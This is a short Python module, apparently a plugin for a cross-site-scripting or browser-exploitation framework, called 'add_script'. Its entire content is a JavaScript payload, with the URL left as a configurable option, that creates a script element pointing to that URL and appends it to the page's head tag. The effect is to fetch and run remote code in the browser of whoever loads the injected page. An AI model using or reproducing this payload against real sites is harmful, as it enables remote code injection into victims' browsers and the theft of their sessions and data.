#!/usr/bin/python3.7
name="add_script"
description="Append external script to the top of the 'head' tag of the site as child element"
options = [['URL', "URL of the external script", ""]]

payload = """

var script=document.createElement('script');
script.type='text/javascript';
script.src='URL';
document.getElementsByTagName('head')[0].appendChild(script);

"""
